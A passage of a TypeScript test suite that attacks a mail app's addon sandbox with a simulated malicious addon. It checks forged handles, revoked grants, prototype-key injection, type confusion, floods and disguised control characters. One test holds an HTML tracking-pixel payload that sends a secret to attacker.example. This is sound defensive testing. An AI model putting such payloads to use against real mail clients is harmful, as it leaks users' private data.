import { newBridge, RawAddon, TestClient, TAccount, TBase, TChild, TFolder, TMessage, TPerson, tick } from "./fixtures";
import type { AddonBridge } from "../../../../logic/Addons/Bridge/AddonBridge";
import type { Grant } from "../../../../logic/Addons/Bridge/Grant";
import { AddonBudget } from "../../../../logic/Addons/Bridge/AddonBudget";
import type { AddonGroup } from "../../../../logic/Addons/API/addon";
import { sanitizeHTMLWithoutLoading } from "../../../../logic/util/convertHTML";
import { ArrayColl } from "svelte-collections";
import { afterEach, describe, expect, test, vi } from "vitest";

// DOMPurify needs a real browser. The Electron security test checks the real sanitizer.
vi.mock("../../../../logic/util/convertHTML", () => ({
  sanitizeHTMLWithoutLoading: vi.fn((html: string) => "<p>sanitized</p>" + html.length),
}));

let cleanups: (() => void)[] = [];
afterEach(() => {
  for (let cleanup of cleanups.splice(0)) {
    cleanup();
  }
});

/** A bridge with a raw (malicious) addon at the other end */
function rawSetup(groups: AddonGroup[] = ["message", "mail"], budget?: AddonBudget) {
  let { bridge, port } = newBridge(groups, budget);
  let addon = new RawAddon(port);
  bridge.start({ name: "Test", version: "1.0.0" });
  cleanups.push(() => {
    bridge.close();
    addon.close();
  });
  return { bridge, addon };
}

/** Gives `object` to the addon, and returns the handle that the addon got */
async function give(bridge: AddonBridge, addon: RawAddon, object: object, grant: Grant): Promise<any> {
  let marker = Math.random();
  bridge.notify("test", "give", { object }, grant, marker);
  let request = await addon.waitFor(op => op.op == "request" && op.d == marker);
  return request.a.object;
}

async function errorOf(addon: RawAddon, op: any): Promise<string | undefined> {
  let reply = await addon.request(op);
  return reply.e?.message;
}

describe("Handles", () => {
  test("Snapshot contains only the fields of the granted groups", async () => {
    let { bridge, addon } = rawSetup(["message", "mail", "mail.all"]);
    let message = new TMessage();
    message.folder = new TFolder();
    let snapshot = await give(bridge, addon, message, bridge.newGrant(["message", "mail"]));
    expect(snapshot.p.subject).toBe("Hello");
    expect(snapshot.p.from.p.name).toBe("Fred");
    expect(snapshot.p.sent).toEqual(message.sent);
    expect(snapshot.p).not.toHaveProperty("folder");
    expect(snapshot.p).not.toHaveProperty("secret");
    expect(snapshot.p).not.toHaveProperty("text");
    expect(JSON.stringify(snapshot)).not.toContain("s3cret");
  });

  test("Forged handles are refused", async () => {
    let { bridge, addon } = rawSetup();
    let snapshot = await give(bridge, addon, new TMessage(), bridge.newGrant(["message", "mail"]));
    for (let h of [snapshot.h + 1000, -1, 0, "1", String(snapshot.h), null, { h: snapshot.h }, [snapshot.h], 1.5]) {
      expect(await errorOf(addon, { op: "call", h, m: "loadBody", a: [] })).toBeTruthy();
    }
    expect(await errorOf(addon, { op: "call", h: snapshot.h, m: "loadBody", a: [] })).toBeUndefined();
  });

  test("Revoked grant: handle and the handles reached from it fail", async () => {
    let { bridge, addon } = rawSetup();
    let message = new TMessage();
    let grant = bridge.newGrant(["message", "mail"]);
    let snapshot = await give(bridge, addon, message, grant);
    let fromH = snapshot.p.from.h;
    let toH = snapshot.p.to.h;
    expect(await errorOf(addon, { op: "call", h: snapshot.h, m: "loadBody" })).toBeUndefined();
    grant.revoke();
    expect(await errorOf(addon, { op: "call", h: snapshot.h, m: "loadBody" })).toBeTruthy();
    expect(await errorOf(addon, { op: "get", h: fromH, m: "name" })).toBeTruthy();
    expect(await errorOf(addon, { op: "set", h: snapshot.h, m: "subject", v: "x" })).toBeTruthy();
    addon.send({ op: "load", h: toH });
    await tick(20);
    expect(addon.ops.filter(op => op.op == "coll" && op.h == toH)).toHaveLength(0);
    expect(bridge.handles.size).toBe(0);
  });

  test("A late result of a revoked grant gives the addon no new handles", async () => {
    let { bridge, addon } = rawSetup(["message", "mail", "mail.all"]);
    let message = new TMessage();
    message.folder = new TFolder();
    let resolveSlow: () => void;
    message.getFolder = async () => {
      await new Promise<void>(resolve => resolveSlow = resolve);
      return message.folder;
    };
    let grant = bridge.newGrant(["message", "mail", "mail.all"]);
    let snapshot = await give(bridge, addon, message, grant);
    let reply = addon.request({ op: "call", h: snapshot.h, m: "getFolder" });
    await tick(10);
    grant.revoke();
    resolveSlow();
    expect((await reply).e).toBeTruthy();
    expect(bridge.handles.size).toBe(0);
  });

  test("Unannotated members and prototype keys are refused", async () => {
    let { bridge, addon } = rawSetup();
    let snapshot = await give(bridge, addon, new TMessage(), bridge.newGrant(["message", "mail"]));
    for (let m of ["secret", "constructor", "__proto__", "prototype", "toString", "valueOf", "hasOwnProperty",
      "subscribe", "notifyObservers", "_properties", "__defineGetter__", "", 5, null, { name: "loadBody" }, ["loadBody"]]) {
      expect(await errorOf(addon, { op: "call", h: snapshot.h, m, a: [] }), String(m)).toBeTruthy();
      expect(await errorOf(addon, { op: "get", h: snapshot.h, m }), String(m)).toBeTruthy();
      expect(await errorOf(addon, { op: "set", h: snapshot.h, m, v: "x" }), String(m)).toBeTruthy();
    }
    expect((await addon.request({ op: "get", h: snapshot.h, m: "text" })).v).toBe("The body");
  });

  test("Operation objects with prototype keys do nothing", async () => {
    let { bridge, addon } = rawSetup();
    let snapshot = await give(bridge, addon, new TMessage(), bridge.newGrant(["message", "mail"]));
    let evil = JSON.parse(`{ "__proto__": { "op": "call", "h": ${snapshot.h}, "m": "loadBody", "id": 99 }, "constructor": { "op": "x" } }`);
    addon.send(evil, "call", null, 5, [{ op: "call" }], { op: "call", id: "1" }, { op: "unknown", id: 98 });
    let reply = await addon.waitFor(op => op.id == 98);
    expect(reply.e.message).toContain("Unknown");
    expect(addon.ops.filter(op => op.id == 99)).toHaveLength(0);
  });

  test("Members of groups that the grant lacks", async () => {
    let { bridge, addon } = rawSetup(["message", "mail", "mail.all"]);
    let message = new TMessage();
    message.folder = new TFolder();
    let snapshot = await give(bridge, addon, message, bridge.newGrant(["message", "mail"]));
    expect(await errorOf(addon, { op: "get", h: snapshot.h, m: "folder" })).toContain("may not");
    // The method is allowed, but its result is a class of a group that the grant lacks
    expect(await errorOf(addon, { op: "call", h: snapshot.h, m: "getFolder" })).toContain("may not get");
    let withAll = await give(bridge, addon, message, bridge.newGrant(["message", "mail", "mail.all"]));
    let folder = (await addon.request({ op: "call", h: withAll.h, m: "getFolder" })).v;
    expect(folder.p.name).toBe("Inbox");
  });

  test("A grant gets only groups that the addon has", async () => {
    let { bridge, addon } = rawSetup(["message", "mail"]);
    let message = new TMessage();
    message.folder = new TFolder();
    let grant = bridge.newGrant(["message", "mail", "mail.all", "mail.compose"]);
    expect(grant.groups.contents.sort()).toEqual(["mail", "message"]);
    let snapshot = await give(bridge, addon, message, grant);
    expect(snapshot.p).not.toHaveProperty("folder");
    expect(await errorOf(addon, { op: "set", h: snapshot.h, m: "subject", v: "x" })).toContain("may not change");
  });

  test("Classes without groups, and other objects, don't cross", async () => {
    let { bridge } = rawSetup();
    let grant = bridge.newGrant(["message", "mail"]);
    for (let object of [new TBase(), new TChild(), {}, { h: 1, c: 0 }, () => 1, new Map(), Symbol("x"), 5n]) {
      expect(() => bridge.notify("test", "give", { object }, grant), String(object?.constructor?.name)).toThrow();
    }
    expect(() => bridge.notify("test", "give", { object: new TMessage() }, null)).toThrow();
    expect(() => bridge.notify("test", "give", { object: new ArrayColl([1, "2"]) }, grant)).not.toThrow();
  });

  test("Service results must be plain data", async () => {
    let { bridge, addon } = rawSetup();
    bridge.registerService("test", {
      call(_bridge, method) {
        return method == "leak" ? { message: new TMessage() } : { ok: [1, "2", null, new Date(0)] };
      },
    });
    expect(await errorOf(addon, { op: "service", s: "test", m: "leak", a: [] })).toContain("plain data");
    expect((await addon.request({ op: "service", s: "test", m: "fine", a: [] })).d.ok[1]).toBe("2");
    expect(await errorOf(addon, { op: "service", s: "__proto__", m: "x", a: [] })).toContain("Unknown service");
    expect(await errorOf(addon, { op: "service", s: "constructor", m: "x", a: [] })).toContain("Unknown service");
  });

  test("Error messages from the addon reach the app without control characters", async () => {
    let { bridge, addon } = rawSetup();
    let pending = bridge.request("test", "fail", {}, null);
    let request = await addon.waitFor(op => op.op == "request" && op.m == "fail");
    addon.send({ op: "reply", id: request.id, e: { name: "Error", message: "Open \u202Etxt.exe\u202C now\u0007\n\uD83D\uDC68\u200D\uD83D\uDC69\u200D\uD83D\uDC67" } });
    await expect(pending).rejects.toSatisfy((ex: Error) => ex.message.includes("txt.exe") && ex.message.includes("\uD83D\uDC68\u200D\uD83D\uDC69\u200D\uD83D\uDC67") && !/[\u202E\u202C\u0007\n]/u.test(ex.message));
  });

  test("App errors reach the addon only as name and message", async () => {
    let { bridge, addon } = rawSetup();
    let snapshot = await give(bridge, addon, new TMessage(), bridge.newGrant(["message", "mail"]));
    let reply = await addon.request({ op: "call", h: snapshot.h, m: "fail" });
    expect(reply.e).toEqual({ name: "Error", message: "Server said no" });
    expect(JSON.stringify(reply)).not.toContain("internal");
  });

  test("Results of the wrong type don't cross", async () => {
    let { bridge, addon } = rawSetup();
    let snapshot = await give(bridge, addon, new TMessage(), bridge.newGrant(["message", "mail"]));
    expect(await errorOf(addon, { op: "call", h: snapshot.h, m: "getSecret" })).toBeTruthy();
  });
});

describe("Arguments and writes", () => {
  async function setupCompose() {
    let { bridge, addon } = rawSetup(["message", "mail", "mail.compose", "mail.all"]);
    let message = new TMessage();
    message.folder = new TFolder();
    let compose = bridge.newGrant(["message", "mail", "mail.compose", "mail.all"]);
    let snapshot = await give(bridge, addon, message, compose);
    return { bridge, addon, message, snapshot, compose };
  }

  test("Write needs the write group", async () => {
    let { bridge, addon } = rawSetup(["message", "mail", "mail.compose"]);
    let message = new TMessage();
    let read = await give(bridge, addon, message, bridge.newGrant(["message", "mail"]));
    expect(await errorOf(addon, { op: "set", h: read.h, m: "subject", v: "Changed" })).toContain("may not change");
    expect(message.subject).toBe("Hello");
    expect(await errorOf(addon, { op: "set", h: read.h, m: "isRead", v: true })).toContain("may not change");
    expect(await errorOf(addon, { op: "set", h: read.h, m: "loadBody", v: true })).toContain("may not change");
    let write = await give(bridge, addon, message, bridge.newGrant(["message", "mail", "mail.compose"]));
    expect(await errorOf(addon, { op: "set", h: write.h, m: "subject", v: "Changed" })).toBeUndefined();
    expect(message.subject).toBe("Changed");
    expect(await errorOf(addon, { op: "set", h: write.h, m: "isRead", v: true })).toContain("may not change");
  });

  test("HTML that the addon writes reaches the app object only sanitized", async () => {
    let { bridge, addon } = rawSetup(["message", "mail", "mail.compose"]);
    let draft = new TMessage();
    let write = await give(bridge, addon, draft, bridge.newGrant(["message", "mail", "mail.compose"]));
    let evil = `<img src="https://attacker.example/pixel?d=secret">`;
    expect(await errorOf(addon, { op: "set", h: write.h, m: "html", v: evil })).toBeUndefined();
    expect(sanitizeHTMLWithoutLoading).toHaveBeenLastCalledWith(evil);
    expect(draft.html).toBe(vi.mocked(sanitizeHTMLWithoutLoading).mock.results.at(-1).value);
    expect(draft.html).not.toContain("attacker.example");
    // Plain strings aren't HTML
    expect(await errorOf(addon, { op: "set", h: write.h, m: "subject", v: evil })).toBeUndefined();
    expect(draft.subject).toBe(evil);
  });

  test("Type confusion: a folder handle where a person is expected", async () => {
    let { addon, message, snapshot } = await setupCompose();
    let folder = (await addon.request({ op: "call", h: snapshot.h, m: "getFolder" })).v;
    let originalFrom = message.from;
    expect(await errorOf(addon, { op: "call", h: snapshot.h, m: "setFrom", a: [{ h: folder.h }] })).toContain("wrong type");
    expect(await errorOf(addon, { op: "call", h: snapshot.h, m: "setFrom", a: [{ h: snapshot.h }] })).toContain("wrong type");
    expect(await errorOf(addon, { op: "call", h: snapshot.h, m: "setFrom", a: [{ name: "Fake", emailAddress: "x@y" }] })).toBeTruthy();
    expect(await errorOf(addon, { op: "call", h: snapshot.h, m: "setFrom", a: ["fred@example.com"] })).toContain("wrong type");
    expect(message.from).toBe(originalFrom);
    expect(await errorOf(addon, { op: "call", h: snapshot.h, m: "setFrom", a: [{ h: snapshot.p.from.h }] })).toBeUndefined();
    expect(await errorOf(addon, { op: "set", h: snapshot.h, m: "subject", v: { h: folder.h } })).toContain("wrong type");
    expect(message.subject).toBe("Hello");
  });

  test("A handle argument works only under the grant of the call", async () => {
    let { bridge, addon } = rawSetup(["message", "mail", "mail.compose"]);
    let viewed = new TMessage();
    let read = await give(bridge, addon, viewed, bridge.newGrant(["message", "mail"]));
    let draft = new TMessage();
    let write = await give(bridge, addon, draft, bridge.newGrant(["message", "mail", "mail.compose"]));
    let originalFrom = draft.from;
    expect(await errorOf(addon, { op: "call", h: write.h, m: "setFrom", a: [{ h: read.p.from.h }] })).toBeTruthy();
    expect(draft.from).toBe(originalFrom);
    expect(await errorOf(addon, { op: "call", h: write.h, m: "setFrom", a: [{ h: write.p.from.h }] })).toBeUndefined();
    expect(draft.from).toBe(originalFrom);
  });

  test("Primitive types, numbers, enums", async () => {
    let { addon, snapshot } = await setupCompose();
    let h = snapshot.h;
    for (let [i, bad] of [NaN, Infinity, -Infinity, "5", null, undefined, 5n, [5], { valueOf: 5 }].entries()) {
      expect(await errorOf(addon, { op: "call", h, m: "count", a: [bad] }), "case " + i).toContain("wrong type");
    }
    expect((await addon.request({ op: "call", h, m: "count", a: [5] })).v).toBe(5);
    for (let bad of ["other", "Flagged", "__proto__", 0, null]) {
      expect(await errorOf(addon, { op: "call", h, m: "mark", a: [bad] }), String(bad)).toContain("wrong type");
    }
    expect((await addon.request({ op: "call", h, m: "mark", a: ["flagged"] })).v).toBe("flagged");
    for (let [i, bad] of [5, new Date(NaN), { toString: "x" }].entries()) {
      expect(await errorOf(addon, { op: "set", h, m: "subject", v: bad }), "case " + i).toContain("wrong type");
    }
  });

  test("Optional and surplus arguments", async () => {
    let { addon, snapshot } = await setupCompose();
    let h = snapshot.h;
    expect((await addon.request({ op: "call", h, m: "echo", a: [] })).v).toBeUndefined();
    expect(await errorOf(addon, { op: "call", h, m: "echo", a: ["a", "b"] })).toContain("at most 1");
    expect(await errorOf(addon, { op: "call", h, m: "echo", a: "abc" })).toContain("at most");
    expect(await errorOf(addon, { op: "call", h, m: "echo", a: { 0: "abc", length: 1 } })).toContain("at most");
  });

  test("Oversized strings and byte arrays", async () => {
    let { addon, snapshot } = await setupCompose();
    let h = snapshot.h;
    let max = "x".repeat(1024 * 1024);
    expect((await addon.request({ op: "call", h, m: "echo", a: [max] })).v).toHaveLength(max.length);
    expect(await errorOf(addon, { op: "call", h, m: "echo", a: [max + "x"] })).toContain("wrong type");
    expect(await errorOf(addon, { op: "set", h, m: "subject", v: max + "x" })).toContain("wrong type");
    expect((await addon.request({ op: "call", h, m: "save", a: [new Uint8Array(10)] })).v).toBe(10);
    // A small view on a big buffer would clone the whole buffer into the app
    let big = new Uint8Array(51 * 1024 * 1024);
    expect(await errorOf(addon, { op: "call", h, m: "save", a: [big.subarray(0, 1)] })).toContain("wrong type");
    expect(await errorOf(addon, { op: "call", h, m: "save", a: [big] })).toContain("wrong type");
    expect(await errorOf(addon, { op: "call", h, m: "save", a: [[1, 2, 3]] })).toContain("wrong type");
    expect(await errorOf(addon, { op: "call", h, m: "save", a: [new Uint16Array(3)] })).toContain("wrong type");
  });
});

describe("Bounds", () => {
  test("Handles per addon, over all its frames", async () => {
    let budget = new AddonBudget(6);
    let first = rawSetup(["message", "mail"], budget);
    let second = rawSetup(["message", "mail"], budget);
    // Each message is 4 handles: message, from, to, tags
    await give(first.bridge, first.addon, new TMessage(), first.bridge.newGrant(["message", "mail"]));
    expect(budget.handles).toBe(4);
    let grant = second.bridge.newGrant(["message", "mail"]);
    expect(() => second.bridge.notify("test", "give", { object: new TMessage() }, grant)).toThrow("more than 6");
    expect(budget.handles).toBeLessThanOrEqual(6);
    first.bridge.close();
    expect(budget.handles).toBeLessThanOrEqual(2);
    let snapshot = await give(second.bridge, second.addon, new TMessage(), second.bridge.newGrant(["message", "mail"]));
    expect(snapshot.p.subject).toBe("Hello");
  });

  test("Calls in flight", async () => {
    let { bridge, addon } = rawSetup();
    let snapshot = await give(bridge, addon, new TMessage(), bridge.newGrant(["message", "mail"]));
    let ops = [];
    for (let id = 1; id <= 1200; id++) {
      ops.push({ op: "call", id, h: snapshot.h, m: "wait" });
    }
    addon.send(...ops);
    await addon.waitFor(op => op.id == 1200);
    let replies = addon.ops.filter(op => op.op == "reply" && op.id <= 1200);
    expect(replies).toHaveLength(200);
    expect(replies.every(op => op.id > 1000 && op.e.message.includes("calls running"))).toBe(true);
  });

  test("Calls in flight, over all frames of the addon", async () => {
    let budget = new AddonBudget();
    let first = rawSetup(["message", "mail"], budget);
    let second = rawSetup(["message", "mail"], budget);
    let firstMessage = await give(first.bridge, first.addon, new TMessage(), first.bridge.newGrant(["message", "mail"]));
    let secondMessage = await give(second.bridge, second.addon, new TMessage(), second.bridge.newGrant(["message", "mail"]));
    let waits = (h: number, count: number) => Array.from({ length: count }, (_, i) => ({ op: "call", id: i + 1, h, m: "wait" }));
    first.addon.send(...waits(firstMessage.h, 700));
    await tick(50);
    second.addon.send(...waits(secondMessage.h, 500));
    await second.addon.waitFor(op => op.id == 500);
    let refused = second.addon.ops.filter(op => op.op == "reply" && op.e?.message.includes("calls running"));
    expect(refused).toHaveLength(200);
  });

  test("Waiting operations, over all frames of the addon", async () => {
    let budget = new AddonBudget();
    let first = rawSetup(["message", "mail"], budget);
    let second = rawSetup(["message", "mail"], budget);
    let message = await give(second.bridge, second.addon, new TMessage(), second.bridge.newGrant(["message", "mail"]));
    // A clock that runs fast: the app works on almost none of the operations per task
    let time = performance.now();
    let clock = vi.spyOn(performance, "now").mockImplementation(() => time += 1000);
    let noops = Array.from({ length: 10000 }, () => ({ op: "release", h: 999999999, n: 1 }));
    for (let i = 0; i < 11; i++) {
      first.addon.send(...noops);
    }
    await tick(100);
    expect(budget.backlog).toBeGreaterThan(100000);
    second.addon.send({ op: "get", id: 1, h: message.h, m: "isRead" });
    await tick(100);
    expect(second.addon.ops.some(op => op.op == "reply" && op.id == 1)).toBe(false);
    clock.mockRestore();
    await vi.waitFor(() => expect(budget.backlog).toBe(0), { timeout: 10000 });
    expect((await second.addon.request({ op: "get", h: message.h, m: "isRead" })).v).toBe(false);
  });

  test("Operations per message", async () => {
    let { bridge, addon } = rawSetup();
    let snapshot = await give(bridge, addon, new TMessage(), bridge.newGrant(["message", "mail"]));
    let ops = [];
    for (let id = 1; id <= 10005; id++) {
      ops.push({ op: "get", id, h: snapshot.h, m: "isRead" });
    }
    addon.send(...ops);
    await addon.waitFor(op => op.id == 10000);
    await tick(20);
    expect(addon.ops.filter(op => op.op == "reply" && op.id > 10000)).toHaveLength(0);
  });

  test("Requests to the addon", async () => {
    let { bridge } = rawSetup();
    let pending = [];
    for (let i = 0; i < 1000; i++) {
      pending.push(bridge.request("test", "x", {}, null).catch(() => {}));
    }
    await expect(bridge.request("test", "x", {}, null)).rejects.toThrow("unanswered");
    bridge.close();
    await Promise.all(pending);
  });

  test("A flood of loads doesn't block the app, and loads only once", async () => {
    let { bridge, addon } = rawSetup(["message", "mail", "mail.all"]);
    let message = new TMessage();
    message.folder = new TFolder();
    for (let i = 0; i < 20000; i++) {
      message.folder.messages.add(new TMessage());
    }
    let snapshot = await give(bridge, addon, message, bridge.newGrant(["message", "mail", "mail.all"]));
    let folder = (await addon.request({ op: "call", h: snapshot.h, m: "getFolder" })).v;
    let folderH = folder.h;
    // Too many to come with the folder
    expect(folder.p.messages.items).toEqual([]);
    expect(folder.p.messages.done).toBe(false);
    let maxDelay = 0;
    let last = performance.now();
    let timer = setInterval(() => {
      let now = performance.now();
      maxDelay = Math.max(maxDelay, now - last);
      last = now;
    }, 5);
    addon.send(...Array.from({ length: 5000 }, () => ({ op: "load", h: folderH, m: "messages" })));
    let messagesH = folder.p.messages.h;
    await addon.waitFor(op => op.op == "coll" && op.h == messagesH && op.done);
    clearInterval(timer);
    let chunks = addon.ops.filter(op => op.op == "coll" && op.h == messagesH);
    expect(chunks.filter(op => op.reset)).toHaveLength(1);
    expect(chunks.flatMap(op => op.add)).toHaveLength(20000);
    expect(addon.received.every(message => message.filter(op => op.op == "coll").reduce((sum, op) => sum + op.add.length, 0) <= 2100)).toBe(true);
    expect(maxDelay).toBeLessThan(500);
  }, 30000);

  test("Too many collection changes collapse into a reload", async () => {
    let { bridge, addon } = rawSetup();
    let message = new TMessage();
    message.tags.addAll(["a", "b"]);
    let snapshot = await give(bridge, addon, message, bridge.newGrant(["message", "mail"]));
    let tagsH = snapshot.p.tags.h;
    expect(snapshot.p.tags.items).toEqual(["a", "b"]);
    for (let i = 0; i < 10002; i++) {
      message.tags.add("t" + i);
    }
    let reset = await addon.waitFor(op => op.op == "coll" && op.h == tagsH && op.reset);
    expect(reset.add).toHaveLength(1000);
    let done = await addon.waitFor(op => op.op == "coll" && op.h == tagsH && op.done);
    let all = addon.ops.filter(op => op.op == "coll" && op.h == tagsH).flatMap(op => op.add);
    expect(all.length).toBe(10004);
    expect(done.add.length).toBeLessThanOrEqual(1000);
  });
});

describe("Changes", () => {
  test("Field changes in one microtask are one message", async () => {
    let { bridge, addon } = rawSetup();
    let first = new TMessage();
    let second = new TMessage();
    let grant = bridge.newGrant(["message", "mail"]);
    let a = await give(bridge, addon, first, grant);
    let b = await give(bridge, addon, second, grant);
    let before = addon.received.length;
    first.subject = "One";
    first.isRead = true;
    first.subject = "Two";
    second.isRead = true;
    second.from.name = "Wilma";
    first.secret = "not sent";
    await tick(20);
    let messages = addon.received.slice(before);
    expect(messages).toHaveLength(1);
    let changes = messages[0];
    expect(changes).toContainEqual({ op: "change", h: a.h, m: "subject", v: "Two" });
    expect(changes).toContainEqual({ op: "change", h: a.h, m: "isRead", v: true });
    expect(changes).toContainEqual({ op: "change", h: b.h, m: "isRead", v: true });
    expect(changes).toContainEqual({ op: "change", h: b.p.from.h, m: "name", v: "Wilma" });
    expect(changes).toHaveLength(4);
  });

  test("A change to an object field sends the new object", async () => {
    let { bridge, addon } = rawSetup();
    let message = new TMessage();
    let snapshot = await give(bridge, addon, message, bridge.newGrant(["message", "mail"]));
    let person = new TPerson();
    person.name = "Barney";
    message.from = person;
    let change = await addon.waitFor(op => op.op == "change" && op.m == "from");
    expect(change.h).toBe(snapshot.h);
    expect(change.v.p.name).toBe("Barney");
    expect(change.v.h).not.toBe(snapshot.p.from.h);
  });

  test("Collection events", async () => {
    let { bridge, addon } = rawSetup();
    let message = new TMessage();
    let fred = new TPerson();
    message.to.add(fred);
    let snapshot = await give(bridge, addon, message, bridge.newGrant(["message", "mail"]));
    let toH = snapshot.p.to.h;
    expect(snapshot.p.to.items.map(item => item.p.name)).toEqual(["Fred"]);
    expect(snapshot.p.to.done).toBe(true);
    let wilma = new TPerson();
    wilma.name = "Wilma";
    message.to.add(wilma);
    message.to.remove(fred);
    let change = await addon.waitFor(op => op.op == "coll" && op.h == toH);
    expect(change.add.map(item => item.p.name)).toEqual(["Wilma"]);
    expect(change.remove).toEqual([{ h: snapshot.p.to.items[0].h }]);
  });

  test("Deeper collections load when the addon asks, in chunks", async () => {
    let { bridge, addon } = rawSetup(["message", "mail", "mail.all"]);
    let account = new TAccount();
    let folder = new TFolder();
    account.folders.add(folder);
    for (let i = 0; i < 2500; i++) {
      folder.messages.add(new TMessage());
    }
    let snapshot = await give(bridge, addon, account, bridge.newGrant(["message", "mail", "mail.all"]));
    let folderRef = snapshot.p.folders.items[0];
    // Without handle, so it costs nothing until the addon reads it
    expect(folderRef.p.messages).toEqual({ coll: 1 });
    let handles = bridge.handles.size;
    addon.send({ op: "load", h: folderRef.h, m: "messages" });
    let first = await addon.waitFor(op => op.op == "coll" && op.of == folderRef.h && op.m == "messages");
    expect(first.reset).toBe(true);
    expect(first.add).toHaveLength(1000);
    let messagesH = first.h;
    expect(bridge.handles.size).toBeGreaterThan(handles);
    let last = await addon.waitFor(op => op.op == "coll" && op.h == messagesH && op.done);
    let chunks = addon.ops.filter(op => op.op == "coll" && op.h == messagesH);
    expect(chunks.length).toBe(3);
    expect(chunks.reduce((sum, op) => sum + op.add.length, 0)).toBe(2500);
    // Items come without their own collection items
    expect(last.add[0].p.to.items).toBeUndefined();
  });

  test("Collections of objects in arrays come without handles", async () => {
    let { bridge, addon } = rawSetup();
    let messages = Array.from({ length: 10 }, () => new TMessage());
    bridge.notify("test", "give", { messages }, bridge.newGrant(["message", "mail"]), "array");
    let request = await addon.waitFor(op => op.op == "request" && op.d == "array");
    expect(request.a.messages[0].p.to).toEqual({ coll: 1 });
    // message and from
    expect(bridge.handles.size).toBe(20);
  });

  test("Loading a field: only readable collection fields of live handles", async () => {
    let { bridge, addon } = rawSetup(["message", "mail", "mail.all"]);
    let message = new TMessage();
    message.folder = new TFolder();
    let grant = bridge.newGrant(["message", "mail"]);
    let snapshot = await give(bridge, addon, message, grant);
    for (let m of ["folder", "subject", "secret", "__proto__", "constructor", "loadBody", 5, null]) {
      addon.send({ op: "load", h: snapshot.h, m });
    }
    addon.send({ op: "load", h: snapshot.p.from.h, m: "name" }, { op: "load", h: 9999, m: "to" });
    await tick(20);
    expect(addon.ops.filter(op => op.op == "coll")).toHaveLength(0);
    grant.revoke();
    addon.send({ op: "load", h: snapshot.h, m: "to" });
    await tick(20);
    expect(addon.ops.filter(op => op.op == "coll")).toHaveLength(0);
  });

  test("No changes for released objects", async () => {
    let { bridge, addon } = rawSetup();
    let message = new TMessage();
    let snapshot = await give(bridge, addon, message, bridge.newGrant(["message", "mail"]));
    let count = bridge.handles.size;
    addon.send({ op: "release", h: snapshot.h, n: 1 });
    await tick(20);
    expect(bridge.handles.size).toBe(count - 1);
    let before = addon.received.length;
    message.subject = "Changed";
    await tick(20);
    expect(addon.received.length).toBe(before);
    expect(await errorOf(addon, { op: "call", h: snapshot.h, m: "loadBody" })).toBeTruthy();
  });

  test("Release with an older count keeps the handle", async () => {
    let { bridge, addon } = rawSetup();
    let message = new TMessage();
    let grant = bridge.newGrant(["message", "mail"]);
    let first = await give(bridge, addon, message, grant);
    let second = await give(bridge, addon, message, grant);
    expect(second.h).toBe(first.h);
    addon.send({ op: "release", h: first.h, n: 1 });
    expect(await errorOf(addon, { op: "call", h: first.h, m: "loadBody" })).toBeUndefined();
    addon.send({ op: "release", h: first.h, n: 1 });
    expect(await errorOf(addon, { op: "call", h: first.h, m: "loadBody" })).toBeTruthy();
  });
});

describe("Roots", () => {
  test("mustang.mail.accounts only with mail.all", async () => {
    for (let groups of [["message", "mail"], ["message", "mail", "mail.compose"], ["message", "chat", "chat.all"]] as AddonGroup[][]) {
      let { bridge, port } = newBridge(groups);
      let addon = new RawAddon(port);
      let accounts = new ArrayColl([new TAccount()]);
      bridge.setRoot("mail", "mail.all", accounts, bridge.newGrant(["message", "mail", "mail.all"]));
      bridge.start({ name: "Test", version: "1" });
      let init = await addon.waitFor(op => op.op == "init");
      expect(init.roots).toEqual({});
      expect(bridge.handles.size).toBe(0);
      for (let h = 0; h < 5; h++) {
        addon.send({ op: "load", h });
      }
      await tick(20);
      expect(addon.ops.filter(op => op.op == "coll")).toHaveLength(0);
      bridge.close();
      addon.close();
    }
  });

  test("Root objects can't be changed with mail.compose", async () => {
    let { bridge, port } = newBridge(["message", "mail", "mail.all", "mail.compose"]);
    let addon = new RawAddon(port);
    let message = new TMessage();
    let folder = new TFolder();
    folder.messages.add(message);
    let account = new TAccount();
    account.folders.add(folder);
    bridge.setRoot("mail", "mail.all", new ArrayColl([account]), bridge.newGrant(["message", "mail", "mail.all"]));
    bridge.start({ name: "Test", version: "1" });
    let init = await addon.waitFor(op => op.op == "init");
    let accountH = init.roots.mail.items[0].h;
    addon.send({ op: "load", h: accountH, m: "folders" });
    let folders = await addon.waitFor(op => op.op == "coll" && op.of == accountH);
    let folderH = folders.add[0].h;
    addon.send({ op: "load", h: folderH, m: "messages" });
    let messages = await addon.waitFor(op => op.op == "coll" && op.of == folderH);
    expect(await errorOf(addon, { op: "set", h: messages.add[0].h, m: "subject", v: "Spoofed" })).toContain("may not change");
    expect(message.subject).toBe("Hello");
    bridge.close();
    addon.close();
  });
});

describe("With the sandbox runtime", () => {
  async function clientSetup(groups: AddonGroup[] = ["message", "mail", "mail.compose"]) {
    let { bridge, port } = newBridge(groups);
    let client = new TestClient();
    client.start(port);
    bridge.start({ name: "Test", version: "1.2.3" });
    await client.whenInitialized();
    cleanups.push(() => {
      bridge.close();
      port.close();
    });
    return { bridge, client, mustang: client.mustang };
  }

  async function context(bridge: AddonBridge, client: TestClient, message: TMessage, grant: Grant): Promise<any> {
    bridge.notify("ui", "context", { message }, grant);
    for (let i = 0; i < 100; i++) {
      let value: any;
      client.mustang.ui.context.subscribe(context => value = context)();
      if (value.message) {
        return value.message;
      }
      await tick(5);
    }
    throw new Error("No context");
  }

  test("Proxies: fields, getters, methods, changes", async () => {
    let { bridge, client, mustang } = await clientSetup();
    expect(mustang.addon.version).toBe("1.2.3");
    let message = new TMessage();
    message.to.add(new TPerson());
    let proxy = await context(bridge, client, message, bridge.newGrant(["message", "mail", "mail.compose"]));
    expect(proxy.subject).toBe("Hello");
    expect(proxy.from.name).toBe("Fred");
    expect(proxy.to.length).toBe(1);
    expect(proxy.sent).toEqual(message.sent);
    expect(await proxy.text).toBe("The body");
    expect(await proxy.count(7)).toBe(7);
    await expect(proxy.count("7")).rejects.toThrow("wrong type");
    expect(() => proxy.folder).toThrow("may not read");
    expect(proxy.secret).toBeUndefined();
    let seen = [];
    let unsubscribe = proxy.subscribe(value => seen.push(value.subject));
    message.subject = "Changed in the app";
    await tick(10);
    expect(proxy.subject).toBe("Changed in the app");
    expect(seen).toEqual(["Hello", "Changed in the app"]);
    unsubscribe();
    proxy.subject = "Changed by the addon";
    await tick(10);
    expect(message.subject).toBe("Changed by the addon");
    expect(proxy.subject).toBe("Changed by the addon");
    await proxy.setFrom(proxy.to.getIndex(0));
    expect(message.from).toBe(message.to.getIndex(0));
  });

